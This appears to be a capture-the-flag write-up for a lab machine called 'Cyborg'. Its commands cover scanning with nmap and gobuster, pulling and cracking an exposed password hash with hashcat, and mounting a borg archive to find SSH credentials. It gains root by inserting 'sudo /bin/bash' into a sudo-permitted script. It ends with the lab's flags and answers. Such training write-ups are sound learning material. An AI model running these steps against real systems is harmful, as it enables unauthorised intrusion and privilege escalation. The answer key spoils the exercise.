# Cyborg
## 17-07-2022
## level : easy

Machine IP : `10.10.55.202`

## Compromise the system

Scan With Nmap
```
nmap -sV 10.10.55.202
```
Directory Scan
```
gobuster dir -u http://10.10.55.202/ -w /usr/share/wordlists/dirb/common.txt -t 50 | tee directory.txt
```
We found two route in the server `/admin` and `/etc`

If we go to `/etc` we can find that there is a password hash available

Extracting the Password Hash
```
wget http://10.10.55.202/etc/squid/passwd
cat passwd | cut -d ":" -f 2 > hash_for_cat.txt
```

in the `hash_for_cat.txt` file we've got the hash and found out that it is of mode `1600` in hashcat


Use Hashcat for cracking the password
```
hashcat -m 1600 hash_for_cat.txt /usr/share/wordlists/rockyou.txt
```

We've got the password in plain text.
The credential is : `music_archive:squidward`

now lets down load the archive from `/admin` page
```
wget http://10.10.55.202/admin/archive.tar
```
Now if we unzip the tar file 
```
tar -xf archive.tar
```
Now if we see the content we can see that this is using borg

We can see the content of this repo using the following
```
mkdir temp_dir
borg mount home/field/dev/final_archive temp_dir

```
Now if we browse the `temp_dir` we can see that inside the `Documents` folder we've got a credential.

Login using that credentials `alex:S3cretP@s3`

```
ssh alex@10.10.55.202
```
After login we can get the user flag.

Now for privilege escalation we use
```
sudo -l
```
We have permission to run `/etc/mp3backups/backup.sh`

At first we will provide the write permission to the file and then add one line at the first of the file
```
sudo /bin/bash
```
Then just run the file 
```
sudo /etc/mp3backups/backup.sh
```

We got the root!

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Scan the machine, how many ports are open? | 2 |
| What service is running on port 22? | SSH |
| What service is running on port 80? | HTTP |
| What is the user.txt flag ? | flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3} |
| What is the root.txt flag ? | flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d} |









#    THE END 
